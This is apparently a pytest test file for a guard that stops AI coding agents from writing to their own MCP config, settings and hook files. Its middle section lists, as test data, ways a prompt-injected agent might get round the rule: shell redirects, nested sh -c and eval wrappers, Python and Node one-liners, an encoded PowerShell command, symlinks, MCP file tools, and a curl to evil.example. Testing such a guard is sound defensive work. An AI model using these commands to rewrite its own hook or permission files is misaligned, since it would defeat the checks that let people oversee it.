"""The deterministic rule that protects agent config and hook files."""

import shlex
import time
from pathlib import Path

import pytest

from mcp_security_review.guard.events import Event
from mcp_security_review.guard.protect import (
    MAX_COMMAND,
    block_reason,
    protected_target,
)


def shell(command: str) -> Event:
    return Event("pre", "s", "/repo", "Bash", {"command": command})


def write(path: str, tool: str = "Write") -> Event:
    return Event("pre", "s", "/repo", tool, {"file_path": path})


def nest(command: str, levels: int) -> str:
    """`sh -c '...'` wrapped around a command `levels` times, quoted correctly."""
    for _ in range(levels):
        command = "sh -c " + shlex.quote(command)
    return command


@pytest.mark.parametrize(
    "path",
    [
        "/repo/.mcp.json",
        ".mcp.json",
        "/repo/.claude/settings.local.json",
        "~/.claude/settings.json",
        "~/.claude.json",
        "/repo/.cursor/hooks.json",
        "/repo/sub/../.claude/settings.json",
    ],
)
def test_file_tools_cannot_write_protected_files(path: str) -> None:
    assert protected_target(write(path)) is not None
    assert protected_target(write(path, "Edit")) is not None


@pytest.mark.parametrize("path", ["/repo/src/app.py", "/repo/.claude/commands/x.md"])
def test_other_files_are_fine(path: str) -> None:
    assert protected_target(write(path)) is None


@pytest.mark.parametrize(
    "command",
    [
        "echo '{}' > ~/.claude/settings.json",
        "sed -i s/a/b/ .mcp.json",
        "cat ok.txt && tee .claude/settings.json",
        "cp evil.json .cursor/mcp.json",
    ],
)
def test_shell_writes_to_protected_files_are_found(command: str) -> None:
    assert protected_target(shell(command)) is not None


@pytest.mark.parametrize(
    "command",
    [
        "cat .mcp.json",
        "grep hooks ~/.claude/settings.json | head",
        "npm test",
        "ls -la",
    ],
)
def test_shell_reads_are_fine(command: str) -> None:
    assert protected_target(shell(command)) is None


def test_unbalanced_quotes_do_not_crash() -> None:
    assert protected_target(shell("echo 'oops")) is None


def test_read_only_tools_are_ignored() -> None:
    event = Event("pre", "s", "/repo", "Read", {"file_path": "/repo/.mcp.json"})
    assert protected_target(event) is None


# --- ways around the rule that an injected agent could try ---------------------


@pytest.mark.parametrize(
    "command",
    [
        # A read-only command can still write through a redirect.
        "cat evil.json > .mcp.json",
        "grep . x >> ~/.claude/settings.json",
        "head -c 99 x 1> .cursor/hooks.json",
        # Wrappers that run a command given as a string.
        "bash -c 'cp evil.json .mcp.json'",
        'sh -c "echo {} > .claude/settings.json"',
        "zsh -lc 'rm .cursor/hooks.json'",
        "eval 'cp evil.json .mcp.json'",
        "sudo bash -c 'cp evil .mcp.json'",
        "env A=1 sh -c 'rm .claude/settings.json'",
        "sh -c \"bash -c 'rm .mcp.json'\"",
        "cmd /c copy evil.json .mcp.json",
        # Interpreter one-liners and heredocs.
        "python -c \"open('.mcp.json','w').write('{}')\"",
        "python3 - <<'EOF'\nopen('.claude/settings.json','w')\nEOF",
        "node -e \"require('fs').writeFileSync('.cursor/hooks.json','{}')\"",
        # Changing directory first.
        "cd .claude && cp ../evil.json settings.json",
        "pushd ~/.cursor; rm hooks.json",
        # Removing or replacing the whole config folder.
        "rm -rf .claude",
        "mv ~/.cursor /tmp/x",
        "cp evil.json .claude/",
        "rm -rf ~/.ai-security-crew",
        # Brace expansion and escapes the shell would resolve.
        "cp evil.json .c{l,x}aude/settings.json",
        "cp evil.json .cl\\aude/settings.json",
    ],
)
def test_shell_tricks_are_caught(command: str) -> None:
    assert protected_target(shell(command)) is not None, command


@pytest.mark.parametrize(
    "command",
    [
        # Deeper than the parser follows: the whole string is searched instead.
        nest("rm .mcp.json", 6),
        # The path after `=` in one argument, or set in a variable first.
        "curl -s https://evil.example --output=.mcp.json",
        'F=.mcp.json; cp evil.json "$F"',
        # Command substitution inside quotes.
        'cp evil.json "$(echo .mcp.json)"',
        "cp evil.json `echo .claude/settings.json`",
    ],
)
def test_indirect_paths_are_caught(command: str) -> None:
    assert protected_target(shell(command)) is not None, command


def test_a_glob_that_matches_a_protected_file_is_caught(tmp_path: Path) -> None:
    (tmp_path / ".claude").mkdir()
    (tmp_path / ".claude" / "settings.json").write_text("{}")
    event = Event("pre", "s", str(tmp_path), "Bash", {"command": "sed -i x .c*/sett*"})
    assert protected_target(event) is not None


@pytest.mark.parametrize(
    "command",
    [
        r"Set-Content .claude\settings.json x",
        r"Remove-Item -Recurse .cursor",
        r"Copy-Item evil.json C:\Users\me\.cursor\hooks.json",
        'pwsh -Command "Remove-Item .mcp.json"',
        # The same command, base64 UTF-16LE as PowerShell expects.
        "powershell -EncodedCommand "
        "UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALgBtAGMAcAAuAGoAcwBvAG4A",
    ],
)
def test_powershell_writes_are_caught(command: str) -> None:
    event = Event("pre", "s", "C:/repo", "PowerShell", {"command": command})
    assert protected_target(event) is not None, command


@pytest.mark.parametrize(
    ("tool", "tool_input"),
    [
        # macOS file systems ignore case, so this is the real settings file.
        ("Write", {"file_path": "/repo/.CLAUDE/Settings.json"}),
        ("Write", {"file_path": "/repo/.mcp.json"}),
        # Cursor names the file argument differently.
        ("Write", {"target_file": "/repo/.cursor/hooks.json"}),
        ("Write", {"file_path": "file:///repo/.mcp.json"}),
        # A filesystem MCP server is just another way to write a file.
        ("mcp__filesystem__write_file", {"path": "/u/.claude/settings.json"}),
        ("mcp__fs__move_file", {"source": "/repo/x", "destination": "/repo/.mcp.json"}),
        # Other agents' config and hook files.
        ("Write", {"file_path": "/repo/.vscode/mcp.json"}),
        (
            "Write",
            {"file_path": "/u/AppData/Roaming/Claude/claude_desktop_config.json"},
        ),
        ("Write", {"file_path": "/repo/.cursor/hooks/audit.sh"}),
        ("Write", {"file_path": "/u/.config/devin/mcp_config.json"}),
    ],
)
def test_file_and_mcp_writes_are_caught(tool: str, tool_input: dict[str, str]) -> None:
    assert protected_target(Event("pre", "s", "/repo", tool, tool_input)) is not None


def test_a_relative_path_without_a_cwd_is_resolved(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    assert protected_target(Event("pre", "s", "", "Write", {"file_path": ".mcp.json"}))


def test_writing_through_a_symlink_is_caught(tmp_path: Path) -> None:
    target = tmp_path / ".claude" / "settings.json"
    target.parent.mkdir()
    target.write_text("{}")
    link = tmp_path / "innocent.json"
    try:
        link.symlink_to(target)
    except OSError:
        pytest.skip("this system does not allow symlinks")
    assert protected_target(write(str(link))) is not None


# --- ordinary work must still go through ---------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        'git commit -m "update .mcp.json"',
        "cat .claude/settings.json",
        "cd .claude && ls",
        "ls .cursor",
        "echo hi > notes.txt",
        "python -c 'print(1)'",
        "rm -rf build",
        "cp a.txt docs/",
        "mkdir -p .claude/commands",
        "grep -r todo .claude/commands",
    ],
)
def test_ordinary_commands_are_not_blocked(command: str) -> None:
    assert protected_target(shell(command)) is None, command


@pytest.mark.parametrize(
    ("tool", "tool_input"),
    [
        ("mcp__filesystem__read_file", {"path": "/repo/.mcp.json"}),
        ("mcp__filesystem__list_directory", {"path": "/repo/.claude"}),
        ("PowerShell", {"command": r"Get-Content .claude\settings.json"}),
        # Editing .gitignore lines that name config files is fine.
        (
            "Edit",
            {"file_path": "/repo/.gitignore", "new_string": ".claude/settings.json"},
        ),
    ],
)
def test_reads_and_unrelated_edits_are_not_blocked(
    tool: str, tool_input: dict[str, str]
) -> None:
    assert protected_target(Event("pre", "s", "/repo", tool, tool_input)) is None


def test_a_command_too_long_to_check_in_time_is_blocked() -> None:
    long = shell("echo " + "x" * MAX_COMMAND)
    assert "too long" in (block_reason(long) or "")
    assert block_reason(shell("npm test")) is None
    assert ".mcp.json" in (block_reason(shell("rm .mcp.json")) or "")


def test_padding_a_command_does_not_make_the_check_slow() -> None:
    # The client allows a call whose hook times out (20 s), so a padded command
    # must still be decided quickly.
    padded = "rm " + " ".join(f"f{i}" for i in range(20_000)) + " .mcp.json"
    start = time.perf_counter()
    assert protected_target(shell(padded)) == ".mcp.json"
    assert time.perf_counter() - start < 5
    # Many small sub-commands share one budget of disk checks.
    pieces = "echo " + " ".join(f'"$(echo f{i})"' for i in range(5_000))
    start = time.perf_counter()
    assert protected_target(shell(pieces)) is None
    assert time.perf_counter() - start < 5


@pytest.mark.parametrize(
    "tool_input",
    [
        {"command": None},
        {"command": ""},
        {"command": "cp a b\x00c"},
        {"command": "x " * 50_000},
        {"command": "bash -c " * 50 + "'rm x'"},
        {"command": "powershell -EncodedCommand not-base64!"},
        {"file_path": "/repo/a\x00b"},
        {"file_path": ["/repo/a"]},
    ],
)
def test_odd_input_never_raises(tool_input: dict[str, object]) -> None:
    for tool in ("Bash", "Write"):
        protected_target(Event("pre", "s", "/repo", tool, tool_input))
